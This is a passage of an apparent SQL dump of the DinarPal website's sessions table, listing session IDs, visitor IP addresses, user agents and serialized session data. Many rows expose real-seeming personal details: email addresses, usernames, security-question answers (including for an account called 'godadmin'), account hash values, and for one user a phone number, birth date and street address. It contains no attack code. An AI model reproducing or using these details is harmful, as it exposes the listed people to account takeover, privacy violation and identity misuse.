username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-26T11:30:35+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('ae4a86f16b95852add9ef3f5cb588398', '45.79.89.188', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461525388, ''),
('ae641bc72deb2dbcd95fec1e58f9c749', '210.186.55.49', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461487483, 'a:51:{s:5:"me_id";s:2:"37";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"dinarfast";s:11:"me_lastname";s:9:"dinarfast";s:11:"me_username";s:9:"dinarfast";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"dinarfast";s:14:"me_unique_link";s:32:"74700f94c74141db6bfea070ca7cefe6";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:17:"hangatt@gmail.com";s:16:"me_register_date";s:19:"2016-04-24 16:32:40";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"2d18eb09212689ab24054f7f355a47d1";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;}'),
('ae65a2ace4a81546c4726d5a2c6a2c42', '180.76.15.157', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461404339, ''),
('ae69fed5ccd98d23f9e803cc6bd5ec91', '141.212.122.161', 'Go http package', 1461098658, ''),
('aeb5dc17967621691ed360469e471c4e', '45.58.42.193', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461766894, ''),
('aec62da8a398d9cd04f7587cac102724', '5.255.253.81', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461485857, ''),
('aec81345fe7be82fe662004b9c8ed475', '103.1.71.217', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; SM-G3', 1461108563, 'a:1:{s:12:"me_id_parent";s:88:"jAORs0iXTCW1CT75hSpDmDsv_SluIF4DGczUMtFJkBFu-PYs_abfPnMc8kMFIH_VzSEQTGsXgvskdELtiyRBNg==";}'),
('aee1f144ec18f25d17541ba6b3f567c5', '62.210.148.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461518432, ''),
('aeea8b7dbac3fb992d507deecc6f03f5', '180.76.15.136', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461192322, ''),
('aef63a8050a7f00d0a6968d614e32784', '103.6.196.115', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461657758, ''),
('aef85ff1c43efb64de432f7222f554cf', '151.80.31.175', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461623803, ''),
('af17e0d5020ff5bc8b6ce4495d043ea3', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767732, ''),
('af206d75ebd457da0ab2a2101739b265', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186643, ''),
('af264e29820be719dca2c2c97b8a0712', '180.76.15.25', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461548874, ''),
('af691c9ee9abeaf0680da7abaea1285a', '118.101.24.30', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (K', 1461129260, ''),
('af85dbc19b9b0442298a457c5e460d0f', '180.76.15.21', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461522764, ''),
('afcc9fcab5c1ca9a81a43883e9ec5efb', '158.69.127.101', '0', 1461867099, ''),
('afeb41f506ca0d80a78ff8463e9f6021', '113.210.54.93', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461231863, 'a:1:{s:12:"me_id_parent";s:88:"4w4Cl_Aeg6IaC-4tFimD9aQzF1a7QZd0wW2v2cWmFIaotb1HH1EIxTyEWk1I1vbiuvPGKOUIjv43hgy7Jqvkag==";}'),
('b00ba94cf6c97b751479421a6590a41b', '5.248.253.133', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)', 1461589809, ''),
('b00eb6765b02484aaf6fad337d7b743f', '210.186.52.118', 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; GT-I9', 1461421101, 'a:1:{s:12:"me_id_parent";s:88:"htTHrwWivAxpkbSI-9F_a1Bsvf2WZoznNRuxb-9X3RBQVstH4bsX5ibkdpfkyPEG4SmuTnWdXJTbifrc4SudMA==";}'),
('b029653de61f913d226bacf23e3fdcbf', '180.76.15.154', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461773898, ''),
('b02b8711b2afac3fded69bdc5f743a57', '207.46.13.106', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461436850, ''),
('b02c7bf5b43149ee050d0ea73376e688', '180.76.15.136', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461791994, ''),
('b050065a4b00b58614df04934fc4c03f', '180.76.15.160', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461417160, ''),
('b0784fe0df7dd2abb071df1a4c27d762', '175.136.140.216', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461766770, 'a:2:{s:12:"me_id_parent";s:8:"BjMOOQ==";s:15:"flash:old:error";s:158:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one CAPS!<br />Password must include at least one symbol!<br />";}'),
('b08640e7b9758b97dba43b72ec24e559', '138.201.16.80', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.', 1461665238, ''),
('b08b1a26cd1d14b86f34de494a1d87b1', '66.249.64.175', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461790349, ''),
('b0a19ab9a3b13260241e180e0baf2d0a', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461635358, ''),
('b11d0699e4253c4a84be14fb6723ecaa', '1.9.102.45', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461692738, ''),
('b165b39422dd6386016ffc27e2186c33', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;', 1461934174, ''),
('b1fee99e14be9e7b904e8b2340706e2b', '74.91.18.43', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461416662, ''),
('b20ff8a292feef312d991cb21856bb7b', '180.76.15.149', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461285245, ''),
('b23c4fb7df215a37d39169314f3d3761', '115.164.218.117', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461249037, 'a:51:{s:5:"me_id";s:2:"16";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-21 18:07:10";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-21T18:09:33+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;s:12:"me_id_parent";s:88:"VIDaYB9QpHzlnSpGkaw1On2iKGR8NOlOx1ajwnWgQCwXOFjz1xJ6VGk_myrLn2caYYPYG5exVhJqpnXg24pqRw==";}'),
('b24029d9a5c321ee41717b9ffc791954', '220.181.108.94', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461316483, ''),
('b2be1ec4bd93aa2abada0524ac5add2c', '115.164.87.230', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461659978, ''),
('b31f34f1cd20152d75dc143fe6b93b07', '62.210.170.165', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461755771, ''),
('b352307465234df930013c2e6c8f08f1', '60.52.24.54', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461480693, 'a:50:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-24T12:39:35+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('b3cf548230e6c6df6049eed79050f55e', '180.76.15.142', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461101991, ''),
('b3f21b55931480dc580810667aa370b7', '209.126.230.74', 'StatsInfo', 1461777291, ''),
('b3f67c89893cc20fc76b7cd7a23364ee', '180.76.15.14', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461231543, ''),
('b4243f78347fcfcea8755ac7bdeb30d7', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160581, ''),
('b439cdafde5f076b55f6d64f9d09bf9b', '175.141.171.212', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461451437, ''),
('b449b87e2cdfe6f92f1fcc18edb10e61', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186643, ''),
('b47c77691a5d1d7a77d6b79bd8f14c3c', '113.210.187.125', 'Mozilla/5.0 (Linux; Android 4.2.2; GT-S7275R Build', 1461472296, 'a:1:{s:12:"me_id_parent";s:88:"0LKIsi43g-yz4gSJC-bknwp8RcuZdw_K8bGTJ2D9Dlegyqk_Su9VW20C9NG2W1T5IfWFX-4QVxCDl8rzI7bu2Q==";}'),
('b4b3c67de908a367e6e2786c9986b97a', '141.8.132.53', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461727669, ''),
('b4c5e8f673185eb0cca07e6295eb501e', '180.76.15.29', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461673136, ''),
('b4e3d2bc0c74eb84e7836a54be7541e0', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)', 1461430341, ''),
('b4f8f1470e1c3885d15490f388b8bc42', '180.76.15.10', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461658445, ''),
('b58d5d2d7659d27da76404569d446853', '180.76.15.13', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461296546, ''),
('b596177a0d46faeba1f4dc97b55e72f2', '169.54.233.126', '0', 1461542496, ''),
('b598daf1a0cce2704402d9f076dfffca', '220.181.51.40', 'curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 O', 1461917518, ''),
('b59b1c73fdd8ced441f7cced34eff311', '115.164.51.133', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461498684, 'a:1:{s:12:"me_id_parent";s:88:"RDhsuRUrsWHt97nDmGwvMTrWnMtANzWzvcf6kCQIs8Nd8nrQEnUwA2s1jbRP-5cpidrMdJRD3yKZm1wE8-cp-w==";}'),
('b5a2279a78054041beb3503f989e2380', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231962, ''),
('b5ef9598bcf0f9bce0613df3cd7c3de8', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461641940, ''),
('b5f62679d72c752054bb1b10e030dcbc', '1.9.209.50', 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A5000 Bu', 1461117926, ''),
('b61aabd29a92e9c1289e4627f380744e', '45.55.229.99', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461718313, ''),
('b65e406607212034a758229659f97481', '175.136.140.216', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461767002, ''),
('b67b42b879f0e3685578b520328f10eb', '113.210.55.79', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461587527, ''),
('b6a64d816f81db861e79b39c76ed007e', '113.210.55.79', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461587497, ''),
('b6df27503231754939738137d55e5c22', '183.171.29.14', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461405537, 'a:1:{s:12:"me_id_parent";s:1:"0";}'),
('b70a9be875c03467cf4635fc6d3f347f', '180.76.15.142', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461929352, ''),
('b70e2f58ce2d615036526c62449b50f2', '5.248.253.133', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)', 1461589808, ''),
('b718f9d70ae77305cfea549cd44bc6e2', '134.249.55.100', 'Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.', 1461690038, ''),
('b72ccdb5b27b7e260165a364fc09489b', '156.31.197.27', 'Mozilla/5.0 (Linux; Android 4.4.4; 3006 Build/KTU8', 1461556764, 'a:2:{s:15:"flash:old:error";s:112:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one symbol!<br />";s:15:"flash:new:error";s:112:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one symbol!<br />";}'),
('b75efb9d3539b81a414d19a27941b36a', '103.1.71.55', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461310243, ''),
('b77e86940f0700ff3ccc8e38adea45c0', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186644, ''),
('b7a6762857a9cabb13e8cd72d550aa37', '123.125.71.108', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461493948, ''),
('b7c97886be5e31bf01364c0921bad418', '183.171.165.185', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G531H Build/', 1461422312, ''),
('b803d582b07b4120d3c84bf31bb43ded', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461451454, ''),
('b81109e549fafe9e78f91b9e85b56840', '123.125.71.81', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461533812, ''),
('b83aeeba18e3cf0b7c76bc8f0e8f51d2', '91.209.51.22', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461154912, ''),
('b86ea03782d01cecda7199bc7c51249f', '66.249.69.116', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461414625, ''),
('b87d73d6cea5a583023bb061e093e97f', '169.54.233.125', '0', 1461521699, ''),
('b8a5e1cf74fb2b7710d7afdbb68eb8e1', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461544037, ''),
('b8df77af47ef1f0785807d39ece79c45', '113.210.61.112', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461770273, 'a:51:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-27T22:23:50+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:10:"me_is_amil";s:3:"yes";s:9:"logged_in";b:1;}'),
('b944b96a97d2d18612d1f8ef465dbef0', '133.242.52.175', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:4', 1461680814, ''),
('b95825ca01d5a247ae66fbc253fcd3ba', '124.13.188.86', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build', 1461498788, 'a:1:{s:12:"me_id_parent";s:88:"uKeZAP07bcVGCj323IHtbeqV-MeM2GP4QYnFO4qCuPC6NKdstGFEQuiok6AD2-k2z7WlFUXDO1bfcibe2dbTnw==";}'),
('b9aefa71f1597cbe7d62f862ca8906a7', '109.236.94.216', 'python-requests/2.9.1', 1461245462, ''),
('ba509e7c81c1c31f4c94fb8d89579283', '157.55.39.218', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461219616, ''),
('ba575bdd3bd02c3974ec7d41e87c9f5d', '207.46.13.50', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461517242, ''),
('ba593d74f46acc7bc0501a432dc84967', '113.210.54.28', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0', 1461135643, ''),
('ba5a93420a7f1ef64c84be179f122a06', '62.210.148.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461518435, ''),
('ba72828928778105ee3452330c553c3a', '115.164.218.233', 'Mozilla/5.0 (Linux; Android 5.1.1; C6903 Build/14.', 1461913455, 'a:1:{s:12:"me_id_parent";s:8:"UmYANA==";}'),
('bab761d29473b7d85737cc766b894fd2', '183.171.160.236', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-A300F Build/', 1461414027, 'a:1:{s:12:"me_id_parent";s:88:"NYbaBxMLXIGLzwtxHCgjanphGvYKb9o53S2uPPeucWeoltcfyRDIiiuUuVBgugQeGxz1dO74wUdx55B-c2vovg==";}'),
('bae7027013ce5a32d9809e2ea51653f1', '80.251.112.201', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461857044, ''),
('bb586f4ab165ba89e53c969bacb7db3b', '180.76.15.160', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461220462, ''),
('bb70c46c005dfb5b3347f51d876ff8c9', '113.210.178.236', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-A800F Build/', 1461498213, 'a:1:{s:12:"me_id_parent";s:88:"hK_FeUsO2hMuC-Yup0drMNyjJgmIzkTfJ_-odr3q5UXIHg5NvO0MoEHARci9OIbVjAnwfMo63zsOOex5ip5gxw==";}'),
('bb93793033ec3c422b4a5dbbc0f80776', '180.76.15.23', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461145166, ''),
('bb94f4a7b6902ea52405b312f752a83b', '173.252.115.5', 'facebookexternalhit/1.1', 1461408694, 'a:1:{s:12:"me_id_parent";s:88:"EuBVjkB9tnWu9wajgiG8T1QNuobGGGY8kHyLw1YG970Q-MZzB7LEgFvyvmUj6K7yhYjC0lBK_xfdxox1AMZoWw==";}'),
('bbd135077e55fd3833d221a14a8a242b', '93.158.152.60', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461727670, ''),
('bbd9c75982c45322d966212b5f92ebde', '115.164.93.145', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00Q Build', 1461421630, 'a:1:{s:15:"flash:old:error";s:110:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one CAPS!<br />";}'),
('bbf5837f285f019aa21ab3f2d2c3723f', '66.249.66.69', 'DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Goog', 1461913040, ''),
('bc0533cf69c73b6fb3bc98dd1475a5f6', '198.186.192.44', '0', 1461876859, ''),
('bc0d59d1ca868e117eed5cbb5dba6e82', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894934, ''),
('bc7a4ef03c70bb7ea39f45bd05d9b101', '180.76.15.24', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461479627, ''),
('bcb99937f22c463eebef1b69555f9655', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461766972, ''),
('bcd1dc4a8a6debeff4fb704511c6f4f4', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461723746, ''),
('bd24b1bbd155a032672eab5db9792cee', '203.113.152.10', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKi', 1461535498, ''),
('bd3a70a8af892a0818582ff07d9e62c5', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461740482, ''),
('bd3d301c93d686c4b3cf69d95c30ac6f', '180.76.15.23', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461595246, ''),
('bd703c95f4e36cfb4c0fcb3aaeba3160', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461262911, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T02:21:49+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('bd840eeb729bbe754a1e0eb76f6426ab', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461199640, ''),
('bdbaeaf40615db7173209c9cf43de5ec', '188.138.33.173', '0', 1461410275, ''),
('bddeaafd6bce52df4e06cae47026e45c', '66.249.69.61', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461536468, ''),
('be15f139060cf9d865c9ff74f2bb4c40', '113.210.63.66', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461475062, ''),
('be24e72111fae07625a74f2da8d4659b', '66.249.69.45', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461539607, ''),
('be465cc8932a71d915a17b1b8708fa62', '66.249.69.52', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461692111, ''),
('be603e2fb0dcb6e13dbcd632d849512a', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461907705, ''),
('be92b29add37c5ff292809ce9e2ee75c', '134.249.55.100', 'Opera/9.0 (Windows NT 5.1; U; en)', 1461188427, ''),
('beb6984382ba37de4ac295d8822afc2c', '175.138.139.183', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00N Build', 1461429106, ''),
